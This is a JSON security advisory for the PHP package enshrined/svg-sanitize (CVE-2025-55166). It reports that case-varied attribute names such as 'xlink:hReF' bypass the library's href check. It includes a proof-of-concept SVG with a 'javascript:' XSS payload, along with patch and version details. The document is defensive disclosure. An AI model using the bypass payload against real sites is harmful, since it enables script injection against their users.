{
  "Severity": "MODERATE",
  "UpdatedAt": "2025-08-12T20:21:00Z",
  "Package": {
    "Ecosystem": "COMPOSER",
    "Name": "enshrined/svg-sanitize"
  },
  "Advisory": {
    "DatabaseId": 307179,
    "Id": "GSA_kwCzR0hTQS0yMndxLXE4Nm0tODNmaM4ABK_r",
    "GhsaId": "GHSA-22wq-q86m-83fh",
    "References": [
      {
        "Url": "https://github.com/darylldoyle/svg-sanitizer/security/advisories/GHSA-22wq-q86m-83fh"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-55166"
      },
      {
        "Url": "https://github.com/darylldoyle/svg-sanitizer/commit/0afa95ea74be155a7bcd6c6fb60c276c39984500"
      },
      {
        "Url": "https://github.com/darylldoyle/svg-sanitizer/commit/5a0a1eaf0c6b0b540dc945fe30c93cf106b357c1"
      },
      {
        "Url": "https://github.com/darylldoyle/svg-sanitizer/blob/0.21.0/src/Sanitizer.php#L454-L481"
      },
      {
        "Url": "https://github.com/darylldoyle/svg-sanitizer/releases/tag/0.22.0"
      },
      {
        "Url": "https://github.com/advisories/GHSA-22wq-q86m-83fh"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-22wq-q86m-83fh"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-55166"
      }
    ],
    "Description": "#### Problem\n\nThe sanitization logic at https://github.com/darylldoyle/svg-sanitizer/blob/0.21.0/src/Sanitizer.php#L454-L481 only searches for lower-case attribute names (e.g. `xlink:href` instead of `xlink:HrEf`), which allows to by-pass the `isHrefSafeValue` check. As a result this allows cross-site scripting or linking to external domains.\n\n#### Proof-of-concept\n_provided by azizk_\n\n```\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003csvg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"100\" height=\"100\"\u003e\n  \u003ca xlink:hReF=\"javascript:alert(document.domain)\"\u003e\n    \u003crect width=\"100\" height=\"50\" fill=\"red\"\u003e\u003c/rect\u003e\n    \u003ctext x=\"50\" y=\"30\" text-anchor=\"middle\" fill=\"white\"\u003eClick me\u003c/text\u003e\n  \u003c/a\u003e\n\u003c/svg\u003e\n```\n\n#### Credits\n\nThe mentioned findings and proof-of-concept example were reported to the TYPO3 Security Team by the external security researcher `azizk \u003cmedazizknani@gmail.com\u003e`.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-08-12T20:20:58Z",
    "Severity": "MODERATE",
    "Summary": "svg-sanitizer Bypasses Attribute Sanitization",
    "UpdatedAt": "2025-08-12T20:21:00Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "0.22.0"
      },
      "VulnerableVersionRange": "\u003c 0.22.0"
    }
  ]
}